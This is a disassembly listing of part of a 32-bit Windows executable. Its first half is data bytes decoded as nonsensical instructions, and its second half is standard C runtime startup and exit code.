  423e1c:	fnstsw WORD PTR [ecx-0x4c]
  423e1f:	pop    ecx
  423e20:	mov    ch,dl
  423e22:	imul   edx,esp,0x70ec67b3
  423e28:	fldenv [ecx]
  423e2a:	call   0xb3119a37
  423e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e30:	lods   al,BYTE PTR ds:[esi]
  423e31:	push   es
  423e32:	push   ss
  423e33:	pop    ds
  423e34:	push   esp
  423e35:	sub    al,BYTE PTR [esi]
  423e37:	sti    
  423e38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e3a:	(bad)  
  423e3b:	cmp    BYTE PTR ds:0x2eaa61bb,ah
  423e41:	and    ch,cl
  423e43:	pop    esp
  423e44:	inc    edx
  423e45:	sbb    DWORD PTR [ebx-0x5f],ebp
  423e48:	mov    edx,0xa8686f90
  423e4d:	jecxz  0x423e40
  423e4f:	lahf   
  423e50:	dec    ebx
  423e51:	std    
  423e52:	lahf   
  423e53:	std    
  423e54:	xchg   esp,eax
  423e55:	adc    al,0x55
  423e57:	inc    ebp
  423e58:	adc    al,BYTE PTR [ebx-0x5b57b41b]
  423e5e:	mov    ah,0xf2
  423e60:	sub    al,0x65
  423e62:	mov    ah,0x28
  423e64:	lods   eax,DWORD PTR ds:[esi]
  423e65:	daa    
  423e66:	push   es
  423e67:	shl    BYTE PTR [edi+0x3d],cl
  423e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e6b:	sub    dh,dh
  423e6d:	dec    edi
  423e6e:	xchg   ebp,eax
  423e6f:	mov    dh,0xf0
  423e71:	or     ebp,DWORD PTR [ecx+ebx*8+0x38]
  423e75:	jnp    0x423e11
  423e77:	shl    DWORD PTR [ebx+0x42],0xd5
  423e7b:	in     al,dx
  423e7c:	inc    edi
  423e7d:	dec    ecx
  423e7e:	or     BYTE PTR [ecx-0x4edee63],bl
  423e84:	add    bl,BYTE PTR [eax]
  423e86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e87:	hlt    
  423e88:	sar    dl,1
  423e8a:	jne    0x423e70
  423e8c:	mov    edx,0x9436ce74
  423e91:	lods   al,BYTE PTR ds:[esi]
  423e92:	in     eax,0x2d
  423e94:	hlt    
  423e95:	lods   al,BYTE PTR ds:[esi]
  423e96:	xlat   BYTE PTR ds:[ebx]
  423e97:	mov    edi,0x85615ddd
  423e9c:	jl     0x423e94
  423e9e:	lods   al,BYTE PTR ds:[esi]
  423e9f:	inc    edi
  423ea0:	aaa    
  423ea1:	cmc    
  423ea2:	xor    eax,0x70ee8aa8
  423ea7:	je     0x423eae
  423ea9:	rol    ecx,1
  423eab:	popa   
  423eac:	pop    eax
  423ead:	popf   
  423eae:	ficom  DWORD PTR [edi]
  423eb0:	fs pop es
  423eb2:	fwait
  423eb3:	push   ss
  423eb4:	pop    ds
  423eb5:	add    DWORD PTR [ecx+0x9276194],esi
  423ebb:	js     0x423f22
  423ebd:	pop    eax
  423ebe:	imul   ecx,esp,0x8f0a1abb
  423ec4:	shr    BYTE PTR [ebp-0xee61b10],1
  423eca:	cmp    edi,DWORD PTR ds:0x7e87b290
  423ed0:	xor    esi,DWORD PTR [ebx]
  423ed2:	push   ecx
  423ed3:	jb     0x423f4b
  423ed5:	lahf   
  423ed6:	repz cmp eax,0xa42d8412
  423edc:	stos   DWORD PTR es:[edi],eax
  423edd:	shr    BYTE PTR ds:0x88b71ce2,0x26
  423ee4:	stos   DWORD PTR es:[edi],eax
  423ee5:	sub    esi,edx
  423ee7:	rcl    esp,1
  423ee9:	loopne 0x423e6e
  423eeb:	or     al,0x62
  423eed:	unpcklps xmm3,xmm0
  423ef0:	ja     0x423edb
  423ef2:	out    0x42,al
  423ef4:	jns    0x423f0a
  423ef6:	pop    ds
  423ef7:	mov    DWORD PTR [edi],ebx
  423ef9:	xchg   ebx,eax
  423efa:	pop    ecx
  423efb:	aaa    
  423efc:	or     eax,0x598ed004
  423f01:	(bad)  
  423f02:	jmp    0x911b:0xdf1ba773
  423f09:	test   BYTE PTR [ecx],cl
  423f0b:	sbb    eax,0x32711999
  423f10:	fadd   DWORD PTR [ebx+0x76a04f86]
  423f16:	cmp    bh,ch
  423f18:	or     al,0x21
  423f1a:	cmp    eax,0x342ddd42
  423f1f:	jb     0x423f75
  423f21:	clc    
  423f22:	in     al,0x44
  423f24:	test   al,0x51
  423f26:	xchg   ecx,eax
  423f27:	mov    al,ds:0xcc034b84
  423f2c:	call   0xf6e7:0x1aa89961
  423f33:	jl     0x423f46
  423f35:	or     al,0xbe
  423f37:	jmp    0xdf700e7a
  423f3c:	xor    DWORD PTR [eax+esi*4-0x11c33dcb],ebx
  423f43:	lods   al,BYTE PTR ds:[esi]
  423f44:	ret    
  423f45:	sbb    DWORD PTR [edi*8+0x66e0e136],esi
  423f4c:	cmp    BYTE PTR [esi+0x24],dl
  423f4f:	lods   eax,DWORD PTR ds:[esi]
  423f50:	or     eax,0x768dded5
  423f55:	and    al,0x3c
  423f57:	mov    bh,0x30
  423f59:	jbe    0x423fcd
  423f5b:	adc    edi,DWORD PTR [esp+ebp*2+0x0]
  423f5f:	and    eax,0xcb9e644f
  423f64:	add    dx,WORD PTR [ebx+0x1a7069c3]
  423f6b:	inc    esp
  423f6c:	call   0x34b68e1a
  423f71:	loope  0x423fcb
  423f73:	leave  
  423f74:	adc    eax,0x384f201d
  423f79:	push   es
  423f7a:	push   ss
  423f7b:	fidiv  DWORD PTR [eax-0x66526ee8]
  423f81:	pop    eax
  423f82:	sub    al,0x10
  423f84:	(bad)  
  423f85:	(bad)  
  423f86:	or     al,0x20
  423f88:	bswap  ebx
  423f8a:	jns    0x423f10
  423f8c:	or     al,0xa1
  423f8e:	jle    0x424008
  423f90:	pusha  
  423f91:	(bad)  
  423f92:	in     eax,0x0
  423f94:	ret    
  423f95:	dec    esi
  423f96:	and    al,0xe
  423f98:	and    dh,bh
  423f9a:	lods   eax,DWORD PTR ds:[esi]
  423f9b:	jl     0x423f40
  423f9d:	push   edx
  423f9e:	mov    dh,0x9b
  423fa0:	xor    eax,0x996eae3
  423fa5:	dec    esi
  423fa6:	sti    
  423fa7:	or     DWORD PTR [ecx],ebp
  423fa9:	addr16 rcl bl,cl
  423fac:	inc    ecx
  423fad:	inc    ebp
  423fae:	inc    ecx
  423faf:	push   edi
  423fb0:	mov    esi,0x8e44a55c
  423fb5:	stc    
  423fb6:	aam    0x4c
  423fb8:	add    dl,BYTE PTR [edi+ebp*8+0x6ea9d19c]
  423fbf:	add    edi,edi
  423fc1:	xor    al,0x3f
  423fc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423fc4:	test   al,0x8c
  423fc6:	dec    esi
  423fc7:	into   
  423fc8:	int3   
  423fc9:	out    0xfa,eax
  423fcb:	jbe    0x424029
  423fcd:	test   edi,0xe6ab1ef2
  423fd3:	dec    ebx
  423fd4:	push   cs
  423fd5:	cmp    DWORD PTR [edx-0x33fd36d1],edx
  423fdb:	fdivr  QWORD PTR [edi-0x4]
  423fde:	mov    ah,0x71
  423fe0:	lock (bad) [eax+0x38]
  423fe4:	xchg   edi,eax
  423fe5:	mov    dl,0x89
  423fe7:	pop    edx
  423fe8:	cmp    ah,BYTE PTR ds:[eax-0x1e]
  423fec:	fadd   DWORD PTR ds:0x5fe3d7db
  423ff2:	pop    esi
  423ff3:	js     0x424035
  423ff5:	ficom  WORD PTR [esi]
  423ff7:	adc    eax,0x19ba19ba
  423ffc:	jnp    0x423fb9
  423ffe:	(bad)  
  423fff:	pop    bx
  424001:	and    DWORD PTR [eax+0x7d],0x70
  424005:	sti    
  424006:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424008:	xchg   ebx,eax
  424009:	push   cs
  42400a:	pop    ebp
  42400b:	pop    ecx
  42400c:	mov    eax,ds:0x44d600d8
  424011:	cwde   
  424012:	das    
  424013:	call   0x5e70:0xd0f04c61
  42401a:	adc    dl,BYTE PTR [edx+0x29ca9273]
  424020:	call   0xd235e8d4
  424025:	push   ss
  424026:	iret   
  424027:	add    bh,BYTE PTR [ecx]
  424029:	icebp  
  42402a:	xchg   edi,eax
  42402b:	sub    al,0xe8
  42402d:	add    ebx,ecx
  42402f:	ret    
  424030:	jno    0x423fb8
  424032:	push   edi
  424033:	lahf   
  424034:	dec    ebp
  424035:	addr16 (bad) 
  424037:	out    0x94,eax
  424039:	inc    esi
  42403a:	inc    eax
  42403b:	adc    esp,ebp
  42403d:	mov    al,0xff
  42403f:	pop    ebp
  424040:	es leave 
  424042:	hlt    
  424043:	jnp    0x42404e
  424045:	in     al,0x9f
  424047:	dec    esp
  424048:	cwde   
  424049:	push   edx
  42404a:	mov    BYTE PTR [edx-0x77cb10],ch
  424050:	dec    edi
  424051:	shl    DWORD PTR [eax],1
  424053:	push   ss
  424054:	idiv   DWORD PTR [eax-0x4bfa25b]
  42405a:	mov    esp,0xce202a33
  42405f:	pop    ebp
  424060:	add    eax,0xd41b29fd
  424065:	stos   DWORD PTR es:[edi],eax
  424066:	cmp    BYTE PTR [ebx+0x5c36e7a7],ch
  42406c:	inc    DWORD PTR [esi+0x69]
  42406f:	and    ecx,DWORD PTR [edx+0x2b]
  424072:	cs pop eax
  424074:	cmp    BYTE PTR [edi+eiz*4+0x3f1a9851],ch
  42407b:	icebp  
  42407c:	mov    BYTE PTR [eax+0x7],al
  42407f:	xchg   esp,eax
  424080:	repnz mov ebx,0xc60f723e
  424086:	ja     0x4240b2
  424088:	lods   eax,DWORD PTR ds:[esi]
  424089:	and    eax,0xaf7e6c7f
  42408e:	fistp  DWORD PTR [esi]
  424090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424091:	and    bh,BYTE PTR [ebx-0x36a48809]
  424097:	adc    BYTE PTR [ecx+eax*8-0x5c],dh
  42409b:	shl    BYTE PTR [ebp+0x66],0xab
  42409f:	adc    edi,DWORD PTR [esi-0x486fb628]
  4240a5:	dec    esp
  4240a6:	xchg   ecx,eax
  4240a7:	cmp    BYTE PTR [edx+0x3cf600d9],0x25
  4240ae:	into   
  4240af:	inc    eax
  4240b0:	mov    eax,gs:0x7848923f
  4240b6:	and    BYTE PTR [ebp-0x69],bh
  4240b9:	(bad)  
  4240ba:	jnp    0x4240d6
  4240bc:	lods   al,BYTE PTR ds:[esi]
  4240bd:	mov    dl,0x54
  4240bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240c0:	imul   ebp,ebx,0x27922be6
  4240c6:	jecxz  0x4240dd
  4240c8:	lds    eax,FWORD PTR [ebx-0x606572ad]
  4240ce:	mov    edi,0xb64c22e5
  4240d3:	aas    
  4240d4:	idiv   BYTE PTR [ebx]
  4240d6:	sahf   
  4240d7:	pop    eax
  4240d8:	and    eax,0x3992dacc
  4240dd:	out    dx,eax
  4240de:	pop    ds
  4240df:	lock jo 0x4240d0
  4240e2:	mov    bh,0x66
  4240e4:	retf   0xd06a
  4240e7:	xchg   ebp,eax
  4240e8:	sub    BYTE PTR [ebx],bl
  4240ea:	fs add dh,dl
  4240ed:	rcr    ch,0x97
  4240f0:	dec    esp
  4240f1:	add    BYTE PTR [ebx-0xc78080],dh
  4240f7:	mov    al,ds:0x45ae20bb
  4240fc:	ucomiss xmm5,xmm3
  4240ff:	daa    
  424100:	outs   dx,DWORD PTR ds:[esi]
  424101:	jns    0x424121
  424103:	frstor [ebx-0x4e]
  424106:	inc    edi
  424107:	add    BYTE PTR [esi+0x2331603d],0x3e
  42410e:	imul   BYTE PTR cs:[esi]
  424111:	div    BYTE PTR [esi]
  424113:	push   ebx
  424114:	mov    ch,0x50
  424116:	jno    0x4240fd
  424118:	jge    0x4240c3
  42411a:	in     al,dx
  42411b:	cld    
  42411c:	inc    eax
  42411d:	and    al,0x93
  42411f:	daa    
  424120:	fdiv   QWORD PTR [eax]
  424122:	div    BYTE PTR [edx]
  424124:	shr    DWORD PTR [ecx-0x7b3d3967],cl
  42412a:	mov    al,0x3d
  42412c:	das    
  42412d:	ss dec ecx
  42412f:	data16 and BYTE PTR ds:[ebx],dl
  424133:	sub    DWORD PTR [esi-0x2e],0x4
  424137:	sub    eax,DWORD PTR [esi]
  424139:	jae    0x424105
  42413b:	js     0x4241af
  42413d:	add    ebx,DWORD PTR [esi+0x7c]
  424140:	cs scas al,BYTE PTR es:[edi]
  424142:	retf   0x382d
  424145:	inc    ecx
  424146:	and    BYTE PTR [esi+0x75],bh
  424149:	and    al,0xb0
  42414b:	test   eax,0x992ad351
  424150:	mov    bh,0xd0
  424152:	mov    edx,0xb9bab8bd
  424157:	not    BYTE PTR [ecx+0x1d951e4]
  42415d:	dec    edx
  42415e:	pop    esi
  42415f:	ret    0xa9d9
  424162:	jle    0x424106
  424164:	push   ebp
  424165:	enter  0xea53,0x59
  424169:	pop    ebp
  42416a:	mov    dh,0xa4
  42416c:	jmp    0xe6b59c90
  424171:	cmp    BYTE PTR [eax-0x7c1d1979],dh
  424177:	mov    ds:0x324868dc,al
  42417c:	inc    ecx
  42417d:	fld    QWORD PTR [edx]
  42417f:	inc    ecx
  424180:	inc    ebx
  424181:	ret    0x9b1c
  424184:	cld    
  424185:	sbb    al,cl
  424187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424189:	sahf   
  42418a:	jmp    0x60d1:0xf854b9dc
  424191:	xchg   ecx,eax
  424192:	cdq    
  424193:	jecxz  0x4241c6
  424195:	aaa    
  424196:	rcl    BYTE PTR [ebp+eiz*4+0x10b25b83],cl
  42419d:	imul   BYTE PTR [eax]
  42419f:	aad    0xc3
  4241a1:	sahf   
  4241a2:	and    bl,bl
  4241a4:	mov    bl,0x43
  4241a6:	das    
  4241a7:	loopne 0x42419b
  4241a9:	push   cs
  4241aa:	cs icebp 
  4241ac:	stos   BYTE PTR es:[edi],al
  4241ad:	cwde   
  4241ae:	cmp    DWORD PTR [edx],eax
  4241b0:	js     0x424162
  4241b2:	mov    esp,0xb02ddddd
  4241b7:	out    dx,al
  4241b8:	pushfw 
  4241ba:	or     BYTE PTR [eax-0x61b2ad2c],0xc0
  4241c1:	fsub   QWORD PTR [eax]
  4241c3:	pop    ss
  4241c4:	mov    eax,ds:0xafd5de29
  4241c9:	cs push cs
  4241cb:	add    ebx,esi
  4241cd:	les    ebx,FWORD PTR [eax+0x63132176]
  4241d3:	stos   BYTE PTR es:[edi],al
  4241d4:	pop    edx
  4241d5:	rcr    edx,0x19
  4241d8:	sub    DWORD PTR [edi+0x6d],0xd4655237
  4241df:	jmp    0x42419b
  4241e1:	jmp    0xd130:0x9d696582
  4241e8:	mov    dh,0xc7
  4241ea:	icebp  
  4241eb:	mov    edx,0x724b0a34
  4241f0:	in     al,dx
  4241f1:	call   0x3172fa4c
  4241f6:	icebp  
  4241f7:	call   0xaa04:0xac02c1e5
  4241fe:	mov    al,0x83
  424200:	inc    ebp
  424201:	cld    
  424202:	push   es
  424203:	xor    edx,ebx
  424205:	or     eax,0x2dd99519
  42420a:	jno    0x4241c7
  42420c:	repnz aaa 
  42420e:	pop    ecx
  42420f:	aad    0x4a
  424211:	mov    esi,0xa5f524c6
  424216:	mov    ?,WORD PTR [eax-0x49f41587]
  42421c:	adc    al,al
  42421e:	mov    eax,0xc901f9f
  424223:	add    ch,BYTE PTR [edi+0x2c]
  424226:	(bad)  
  424227:	test   al,0xd9
  424229:	or     eax,0x4824aa60
  42422e:	pop    edi
  42422f:	call   0xcaee:0x934004ad
  424236:	adc    edx,DWORD PTR [eax]
  424238:	sub    eax,ebp
  42423a:	pushf  
  42423b:	lock (bad) 
  42423d:	jl     0x424244
  42423f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424240:	lea    eax,[edx-0x2a]
  424243:	sub    al,0xd1
  424245:	popf   
  424246:	sbb    DWORD PTR [ecx-0x75c78062],edx
  42424c:	fs pop ds
  42424e:	xor    eax,0x3b936c07
  424253:	or     bh,BYTE PTR ds:0xd14a407e
  424259:	mov    dh,0xe6
  42425b:	out    0xc0,al
  42425d:	and    eax,0x5f6653e3
  424262:	mov    esi,0x21af06a5
  424267:	mov    ebp,0xb1bc5a5b
  42426c:	and    edx,DWORD PTR [ecx]
  42426e:	push   edi
  42426f:	push   eax
  424270:	jecxz  0x42421d
  424272:	xchg   DWORD PTR [ecx],ebx
  424274:	jmp    0x4242d6
  424276:	fdivr  QWORD PTR [eax-0x76]
  424279:	lods   al,BYTE PTR ds:[esi]
  42427a:	inc    edx
  42427b:	dec    ecx
  42427c:	push   ds
  42427d:	mov    WORD PTR [ebp+0x47],?
  424280:	icebp  
  424281:	xchg   edx,eax
  424282:	mov    eax,0x8b7e5eef
  424287:	lea    ebx,ds:0x8cb8e5b9
  42428d:	and    eax,edi
  42428f:	push   ds
  424290:	call   DWORD PTR [esi]
  424292:	stos   DWORD PTR es:[edi],eax
  424293:	leave  
  424294:	cmp    al,0x14
  424296:	outs   dx,BYTE PTR ds:[esi]
  424297:	jno    0x42426e
  424299:	in     eax,0x4f
  42429b:	mov    eax,0x371f8d9
  4242a0:	ins    DWORD PTR es:[edi],dx
  4242a1:	cmp    ebx,eax
  4242a3:	pop    ebx
  4242a4:	lods   al,BYTE PTR ds:[esi]
  4242a5:	pop    esp
  4242a6:	loope  0x4242b9
  4242a8:	pushf  
  4242a9:	lea    esi,[ebx+0x6b4680ac]
  4242af:	(bad)  
  4242b0:	cwde   
  4242b1:	or     al,0x60
  4242b3:	(bad)  
  4242b4:	mov    WORD PTR [eax+0x60],cs
  4242b7:	inc    eax
  4242b8:	sub    al,0x55
  4242ba:	push   ss
  4242bb:	pop    ss
  4242bc:	push   ss
  4242bd:	jo     0x42431f
  4242bf:	mov    ecx,0xc46c24df
  4242c4:	adc    BYTE PTR [esi+0x64bf8230],dl
  4242ca:	data16 aaa 
  4242cc:	mov    al,ds:0xf7c1782c
  4242d1:	repnz lods eax,DWORD PTR ds:[esi]
  4242d3:	inc    esp
  4242d4:	push   esi
  4242d5:	out    dx,al
  4242d6:	or     BYTE PTR [edx-0x2a38d1e3],0x22
  4242dd:	loopne 0x424281
  4242df:	mov    ebp,0x40d71d9d
  4242e4:	jb     0x42432c
  4242e6:	mov    esp,0x568a7a3
  4242eb:	pop    ebp
  4242ec:	out    dx,al
  4242ed:	das    
  4242ee:	mov    edx,0x11074e16
  4242f3:	test   BYTE PTR [ebp-0x52],dl
  4242f6:	and    ecx,DWORD PTR [eax+0x60]
  4242f9:	and    al,0x17
  4242fb:	loope  0x42430f
  4242fd:	add    edi,esi
  4242ff:	or     al,0xe5
  424301:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  424303:	mov    ah,0x85
  424305:	mov    ss,WORD PTR [edi]
  424307:	add    al,0xcb
  424309:	inc    ebx
  42430a:	mov    bh,0x1a
  42430c:	mov    BYTE PTR [ecx+0x6a],dl
  42430f:	jmp    0x14f16a16
  424314:	cld    
  424315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424316:	mov    esp,0x39305109
  42431b:	retf   
  42431c:	mov    gs,WORD PTR [ecx-0x629c19d7]
  424322:	das    
  424323:	jmp    0xa188:0x77a8c9d9
  42432a:	jg     0x424330
  42432c:	or     BYTE PTR [edi-0x46def3e9],dl
  424332:	mov    cl,BYTE PTR [ebp-0x11]
  424335:	test   BYTE PTR [esi+0x78],cl
  424338:	dec    esi
  424339:	push   ds
  42433a:	mov    esp,0x26060ce3
  42433f:	and    eax,0x557487cd
  424344:	cmc    
  424345:	(bad)  
  424346:	aas    
  424347:	push   cs
  424348:	mov    dh,0x4d
  42434a:	sub    ebx,ebx
  42434c:	or     DWORD PTR [edi],edx
  42434e:	add    dl,BYTE PTR [ecx]
  424350:	aam    0xb4
  424352:	test   bl,al
  424354:	jo     0x42436b
  424356:	les    ebx,FWORD PTR [ecx+ebx*4-0x31]
  42435a:	pop    esp
  42435b:	sbb    ecx,esp
  42435d:	sbb    al,0x5a
  42435f:	pop    esp
  424360:	pop    ebx
  424361:	mov    ds:0x1d6b08aa,al
  424366:	jne    0x42437f
  424368:	shl    ecx,1
  42436a:	idiv   edx
  42436c:	xchg   BYTE PTR [ecx-0xede72e2],bh
  424372:	and    eax,0x23549f39
  424377:	dec    edx
  424378:	sbb    dl,ch
  42437a:	ror    BYTE PTR [ebx-0x9],1
  42437d:	mov    ds:0x8239a991,eax
  424382:	mov    WORD PTR [edi+0xc5ee22a],ss
  424388:	xchg   ebp,eax
  424389:	ficomp DWORD PTR [edx+0x3]
  42438c:	mov    esp,0x6f23efa3
  424391:	ficomp DWORD PTR ds:0xb5946ab9
  424397:	push   ss
  424398:	jns    0x424393
  42439a:	xor    BYTE PTR [ebp+0x68e0af22],ch
  4243a0:	(bad)  
  4243a2:	add    al,0x5d
  4243a4:	in     al,0x24
  4243a6:	mov    gs,ebx
  4243a8:	call   0xc9b2:0x32dae227
  4243af:	jle    0x4243d5
  4243b1:	into   
  4243b2:	add    BYTE PTR [eax+0x3a],al
  4243b5:	mov    cl,0x2b
  4243b7:	sar    BYTE PTR [ebp-0x62],0x2d
  4243bb:	sbb    di,WORD PTR [ebp+0x6182d39c]
  4243c2:	outs   dx,BYTE PTR ds:[esi]
  4243c3:	jmp    FWORD PTR [ebx]
  4243c5:	rcr    DWORD PTR [edx],0x51
  4243c8:	jbe    0x42443a
  4243ca:	xor    eax,0xb5edc457
  4243cf:	call   0xa988:0x54fb09e7
  4243d6:	or     bl,BYTE PTR [ecx-0x4e]
  4243d9:	jmp    0x4be0:0x628ce85c
  4243e0:	sub    dl,BYTE PTR [ebx+0x4]
  4243e3:	imul   ebx,DWORD PTR [edx],0x7b
  4243e6:	jo     0x42439e
  4243e8:	idiv   bl
  4243ea:	cdq    
  4243eb:	mov    cl,0x90
  4243ed:	fild   QWORD PTR [edx+0x0]
  4243f0:	push   0x0
  4243f2:	call   0x424400
  4243f7:	xor    eax,eax
  4243f9:	add    esp,0x10
  4243fc:	ret    0x10
  4243ff:	nop
  424400:	jmp    DWORD PTR ds:0x429110
  424406:	cmp    DWORD PTR ds:0x45dabc,0x1
  42440d:	jne    0x424414
  42440f:	call   0x424952
  424414:	push   DWORD PTR [esp+0x4]
  424418:	call   0x4247db
  42441d:	push   0xff
  424422:	call   DWORD PTR ds:0x45d1c0
  424428:	pop    ecx
  424429:	pop    ecx
  42442a:	ret    
  42442b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424432:	jne    0x424439
  424434:	call   0x424952
  424439:	push   DWORD PTR [esp+0x4]
  42443d:	call   0x4247db
  424442:	push   0xff
  424447:	call   0x424621
  42444c:	pop    ecx
  42444d:	pop    ecx
  42444e:	ret    
  42444f:	push   0x60
  424451:	push   0x429220
  424456:	call   0x425340
  42445b:	mov    edi,0x94
  424460:	mov    eax,edi
  424462:	call   0x425390
  424467:	mov    DWORD PTR [ebp-0x18],esp
  42446a:	mov    esi,esp
  42446c:	mov    DWORD PTR [esi],edi
  42446e:	push   esi
  42446f:	call   DWORD PTR ds:0x429054
  424475:	mov    ecx,DWORD PTR [esi+0x10]
  424478:	mov    DWORD PTR ds:0x45dac4,ecx
  42447e:	mov    eax,DWORD PTR [esi+0x4]
  424481:	mov    ds:0x45dad0,eax
  424486:	mov    edx,DWORD PTR [esi+0x8]
  424489:	mov    DWORD PTR ds:0x45dad4,edx
  42448f:	mov    esi,DWORD PTR [esi+0xc]
  424492:	and    esi,0x7fff
  424498:	mov    DWORD PTR ds:0x45dac8,esi
  42449e:	cmp    ecx,0x2
  4244a1:	je     0x4244af
  4244a3:	or     esi,0x8000
  4244a9:	mov    DWORD PTR ds:0x45dac8,esi
  4244af:	shl    eax,0x8
  4244b2:	add    eax,edx
  4244b4:	mov    ds:0x45dacc,eax
  4244b9:	xor    esi,esi
  4244bb:	push   esi
  4244bc:	mov    edi,DWORD PTR ds:0x429024
  4244c2:	call   edi
  4244c4:	cmp    WORD PTR [eax],0x5a4d
  4244c9:	jne    0x4244ea
  4244cb:	mov    ecx,DWORD PTR [eax+0x3c]
  4244ce:	add    ecx,eax
  4244d0:	cmp    DWORD PTR [ecx],0x4550
  4244d6:	jne    0x4244ea
  4244d8:	movzx  eax,WORD PTR [ecx+0x18]
  4244dc:	cmp    eax,0x10b
  4244e1:	je     0x424502
  4244e3:	cmp    eax,0x20b
  4244e8:	je     0x4244ef
  4244ea:	mov    DWORD PTR [ebp-0x1c],esi
  4244ed:	jmp    0x424516
  4244ef:	cmp    DWORD PTR [ecx+0x84],0xe
  4244f6:	jbe    0x4244ea
  4244f8:	xor    eax,eax
  4244fa:	cmp    DWORD PTR [ecx+0xf8],esi
  424500:	jmp    0x424510
  424502:	cmp    DWORD PTR [ecx+0x74],0xe
  424506:	jbe    0x4244ea
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xe8],esi
  424510:	setne  al
  424513:	mov    DWORD PTR [ebp-0x1c],eax
  424516:	push   0x1
  424518:	call   0x4252ed
  42451d:	pop    ecx
  42451e:	test   eax,eax
  424520:	jne    0x42452a
  424522:	push   0x1c
  424524:	call   0x42442b
  424529:	pop    ecx
  42452a:	call   0x425264
  42452f:	test   eax,eax
  424531:	jne    0x42453b
  424533:	push   0x10
  424535:	call   0x42442b
  42453a:	pop    ecx
  42453b:	call   0x42514d
  424540:	mov    DWORD PTR [ebp-0x4],esi
  424543:	call   0x424f4f
  424548:	test   eax,eax
  42454a:	jge    0x424554
  42454c:	push   0x1b
  42454e:	call   0x424406
  424553:	pop    ecx
  424554:	call   DWORD PTR ds:0x429050
  42455a:	mov    ds:0x45e274,eax
  42455f:	call   0x424e2d
  424564:	mov    ds:0x45dab4,eax
  424569:	call   0x424d8b
  42456e:	test   eax,eax
  424570:	jge    0x42457a
  424572:	push   0x8
  424574:	call   0x424406
  424579:	pop    ecx
  42457a:	call   0x424b58
  42457f:	test   eax,eax
  424581:	jge    0x42458b
  424583:	push   0x9
  424585:	call   0x424406
  42458a:	pop    ecx
  42458b:	call   0x424663
  424590:	mov    DWORD PTR [ebp-0x20],eax
  424593:	cmp    eax,esi
  424595:	je     0x42459e
  424597:	push   eax
  424598:	call   0x424406
  42459d:	pop    ecx
  42459e:	mov    DWORD PTR [ebp-0x38],esi
  4245a1:	lea    eax,[ebp-0x64]
  4245a4:	push   eax
  4245a5:	call   DWORD PTR ds:0x42904c
  4245ab:	call   0x424aef
  4245b0:	mov    DWORD PTR [ebp-0x68],eax
  4245b3:	test   BYTE PTR [ebp-0x38],0x1
  4245b7:	je     0x4245bf
  4245b9:	movzx  eax,WORD PTR [ebp-0x34]
  4245bd:	jmp    0x4245c2
  4245bf:	push   0xa
  4245c1:	pop    eax
  4245c2:	push   eax
  4245c3:	push   DWORD PTR [ebp-0x68]
  4245c6:	push   esi
  4245c7:	push   esi
  4245c8:	call   edi
  4245ca:	push   eax
  4245cb:	call   0x422f80
  4245d0:	mov    edi,eax
  4245d2:	mov    DWORD PTR [ebp-0x6c],edi
  4245d5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245d8:	jne    0x4245e0
  4245da:	push   edi
  4245db:	call   0x42479b
  4245e0:	call   0x4247bd
  4245e5:	jmp    0x424612
  4245e7:	mov    eax,DWORD PTR [ebp-0x14]
  4245ea:	mov    ecx,DWORD PTR [eax]
  4245ec:	mov    ecx,DWORD PTR [ecx]
  4245ee:	mov    DWORD PTR [ebp-0x70],ecx
  4245f1:	push   eax
  4245f2:	push   ecx
  4245f3:	call   0x42498b
  4245f8:	pop    ecx
  4245f9:	pop    ecx
  4245fa:	ret    
  4245fb:	mov    esp,DWORD PTR [ebp-0x18]
  4245fe:	mov    edi,DWORD PTR [ebp-0x70]
  424601:	cmp    DWORD PTR [ebp-0x1c],0x0
  424605:	jne    0x42460d
  424607:	push   edi
  424608:	call   0x4247ac
  42460d:	call   0x4247cc
  424612:	or     DWORD PTR [ebp-0x4],0xffffffff
  424616:	mov    eax,edi
  424618:	lea    esp,[ebp-0x7c]
  42461b:	call   0x42537b
  424620:	ret    
  424621:	push   0x42923c
  424626:	call   DWORD PTR ds:0x429024
  42462c:	test   eax,eax
  42462e:	je     0x424646
  424630:	push   0x42922c
  424635:	push   eax
  424636:	call   DWORD PTR ds:0x429020
  42463c:	test   eax,eax
  42463e:	je     0x424646
  424640:	push   DWORD PTR [esp+0x4]
  424644:	call   eax
  424646:	push   DWORD PTR [esp+0x4]
  42464a:	call   DWORD PTR ds:0x429058
  424650:	int3   
  424651:	push   0x8
  424653:	call   0x4254ff
  424658:	pop    ecx
  424659:	ret    
  42465a:	push   0x8
  42465c:	call   0x42546b
  424661:	pop    ecx
  424662:	ret    
  424663:	mov    eax,ds:0x45e270
  424668:	test   eax,eax
  42466a:	je     0x42466e
  42466c:	call   eax
  42466e:	push   esi
  42466f:	push   edi
  424670:	mov    ecx,0x42b00c
  424675:	mov    edi,0x42b018
  42467a:	xor    eax,eax
  42467c:	cmp    ecx,edi
  42467e:	mov    esi,ecx
  424680:	jae    0x424699
  424682:	test   eax,eax
  424684:	jne    0x4246c5
  424686:	mov    ecx,DWORD PTR [esi]
  424688:	test   ecx,ecx
  42468a:	je     0x42468e
  42468c:	call   ecx
  42468e:	add    esi,0x4
  424691:	cmp    esi,edi
  424693:	jb     0x424682
  424695:	test   eax,eax
  424697:	jne    0x4246c5
  424699:	push   0x425191
  42469e:	call   0x425610
  4246a3:	mov    esi,0x42b000
  4246a8:	mov    eax,esi
  4246aa:	mov    edi,0x42b008
  4246af:	cmp    eax,edi
  4246b1:	pop    ecx
  4246b2:	jae    0x4246c3
